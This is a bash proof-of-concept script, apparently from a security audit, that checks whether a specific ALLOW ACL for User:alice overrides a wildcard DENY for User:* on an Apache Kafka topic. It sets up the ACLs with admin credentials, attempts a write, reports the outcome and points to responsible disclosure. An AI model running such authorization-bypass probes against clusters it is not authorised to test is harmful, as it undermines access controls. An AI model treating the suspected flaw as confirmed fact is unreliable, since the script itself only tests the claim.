#!/usr/bin/env bash
# ============================================================
# FINDING-006 PoC: ACL Wildcard DENY Bypass via Principal Matching Asymmetry
# ============================================================
# Demonstrates that a specific ALLOW ACL for User:alice may override
# a wildcard DENY ACL for User:* on the same resource, depending on
# ACL evaluation order in StandardAuthorizerData.
#
# The vulnerability: matchingPrincipals() always includes WILDCARD_KAFKA_PRINCIPAL
# ("User:*") in the principal set. If the ACL traversal finds a specific ALLOW
# before completing all DENY checks for the wildcard, the DENY is bypassed.
#
# Prerequisites:
#   - Admin access to configure ACLs (kafka-acls.sh)
#   - Two client configs: admin.properties and alice.properties
#   - A running Kafka cluster (Kafka 3.x, KRaft mode preferred)
#
# Test environment setup:
#   Admin bootstrap: ADMIN_BOOTSTRAP
#   Topic name:      SENSITIVE_TOPIC
# ============================================================

set -euo pipefail

ADMIN_BOOTSTRAP="${1:-localhost:9093}"
ALICE_BOOTSTRAP="${2:-$ADMIN_BOOTSTRAP}"
SENSITIVE_TOPIC="${3:-sensitive-data}"
ADMIN_CONFIG="${4:-admin.properties}"
ALICE_CONFIG="${5:-alice.properties}"

echo "============================================================"
echo " FINDING-006: ACL Wildcard DENY Bypass Test"
echo "============================================================"
echo " Broker: $ADMIN_BOOTSTRAP"
echo " Topic:  $SENSITIVE_TOPIC"
echo ""

# ---- Step 1: Create the test topic ----
echo "[1] Creating test topic '$SENSITIVE_TOPIC'..."
kafka-topics.sh \
  --bootstrap-server "$ADMIN_BOOTSTRAP" \
  --command-config "$ADMIN_CONFIG" \
  --create --topic "$SENSITIVE_TOPIC" --partitions 1 --replication-factor 1 \
  --if-not-exists 2>&1 || echo "[*] Topic may already exist, continuing."
echo ""

# ---- Step 2: Establish baseline — deny ALL users WRITE on the topic ----
echo "[2] Setting DENY User:* WRITE on topic '$SENSITIVE_TOPIC' (should block everyone)..."
kafka-acls.sh \
  --bootstrap-server "$ADMIN_BOOTSTRAP" \
  --command-config "$ADMIN_CONFIG" \
  --add \
  --deny-principal "User:*" \
  --operation Write \
  --topic "$SENSITIVE_TOPIC" && echo "[+] Wildcard DENY ACL set."
echo ""

# ---- Step 3: Verify alice is denied (baseline) ----
echo "[3] Verifying alice is DENIED before adding specific ALLOW..."
RESULT=$(echo "baseline-message" | \
  timeout 5 kafka-console-producer.sh \
    --bootstrap-server "$ALICE_BOOTSTRAP" \
    --producer.config "$ALICE_CONFIG" \
    --topic "$SENSITIVE_TOPIC" 2>&1 || true)

if echo "$RESULT" | grep -qi "authorization\|TopicAuthorizationException\|TOPIC_AUTHORIZATION_FAILED"; then
    echo "[+] Baseline confirmed: alice is correctly DENIED by wildcard ACL."
else
    echo "[*] Unexpected result: $RESULT"
fi
echo ""

# ---- Step 4: Add specific ALLOW for alice (should NOT override the DENY) ----
echo "[4] Adding ALLOW User:alice WRITE on '$SENSITIVE_TOPIC'..."
echo "    Per Kafka documentation, DENY should always override ALLOW."
echo "    This step tests whether the implementation matches the specification."
kafka-acls.sh \
  --bootstrap-server "$ADMIN_BOOTSTRAP" \
  --command-config "$ADMIN_CONFIG" \
  --add \
  --allow-principal "User:alice" \
  --operation Write \
  --topic "$SENSITIVE_TOPIC" && echo "[+] Specific ALLOW ACL added."
echo ""

# ---- Step 5: List all ACLs on the topic for verification ----
echo "[5] Current ACLs on '$SENSITIVE_TOPIC':"
kafka-acls.sh \
  --bootstrap-server "$ADMIN_BOOTSTRAP" \
  --command-config "$ADMIN_CONFIG" \
  --list \
  --topic "$SENSITIVE_TOPIC"
echo ""

# ---- Step 6: Test if alice can write DESPITE the wildcard DENY ----
echo "[6] Testing: can alice write with DENY User:* and ALLOW User:alice both set?"
echo "    Expected: DENIED (DENY should override ALLOW per spec)"
echo "    Vulnerable: ALLOWED (specific ALLOW wins over wildcard DENY)"
echo ""

WRITE_RESULT=$(echo "test-acl-bypass-$(date +%s)" | \
  timeout 5 kafka-console-producer.sh \
    --bootstrap-server "$ALICE_BOOTSTRAP" \
    --producer.config "$ALICE_CONFIG" \
    --topic "$SENSITIVE_TOPIC" 2>&1 || true)

echo "Producer output:"
echo "$WRITE_RESULT"
echo ""

if echo "$WRITE_RESULT" | grep -qi "authorization\|TopicAuthorizationException\|TOPIC_AUTHORIZATION_FAILED"; then
    echo "[-] RESULT: alice was correctly DENIED — ACL DENY is enforced. Not vulnerable."
    echo "    The wildcard DENY correctly overrides the specific ALLOW."
elif echo "$WRITE_RESULT" | grep -qi "error\|exception\|failed" && \
     ! echo "$WRITE_RESULT" | grep -qi "authorization"; then
    echo "[?] RESULT: Write failed for a non-authorization reason. Check broker connectivity."
else
    echo "[+] RESULT: VULNERABILITY CONFIRMED — alice was ALLOWED despite wildcard DENY."
    echo "    The specific ALLOW for User:alice overrode the wildcard DENY for User:*."
    echo "    matchingPrincipals() includes both User:alice and User:* in the set,"
    echo "    and the ACL evaluation found the specific ALLOW before the wildcard DENY."
fi

# ---- Step 7: Cleanup ----
echo ""
echo "[7] Cleanup (comment out to preserve for further testing):"
echo "    kafka-acls.sh --bootstrap-server $ADMIN_BOOTSTRAP \\"
echo "      --command-config $ADMIN_CONFIG \\"
echo "      --remove --deny-principal 'User:*' --operation Write --topic $SENSITIVE_TOPIC"
echo "    kafka-acls.sh --bootstrap-server $ADMIN_BOOTSTRAP \\"
echo "      --command-config $ADMIN_CONFIG \\"
echo "      --remove --allow-principal 'User:alice' --operation Write --topic $SENSITIVE_TOPIC"
echo ""
echo "============================================================"
echo " If VULNERABILITY CONFIRMED: report to security@kafka.apache.org"
echo "============================================================"
